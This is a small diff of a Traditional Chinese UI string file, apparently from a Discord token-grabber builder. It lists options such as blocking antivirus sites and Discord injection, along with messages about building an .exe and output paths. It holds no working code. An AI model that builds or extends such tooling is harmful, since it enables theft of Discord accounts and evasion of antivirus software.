@@ -253,7 +253,7 @@ BlockAvSites（是/否）
 DiscordInjection（是/否）
 檔案圖示
 Creating {name}.exe，這將需要幾秒鐘。感謝您的耐心！
-文件在 'output/grabberbuilder/{name}.exe'
+文件在 {path}
 已創建群組聊天
 速率限制（{response.json()['retry_after']}毫秒）
 沒有足夠的好友可供隨機選擇
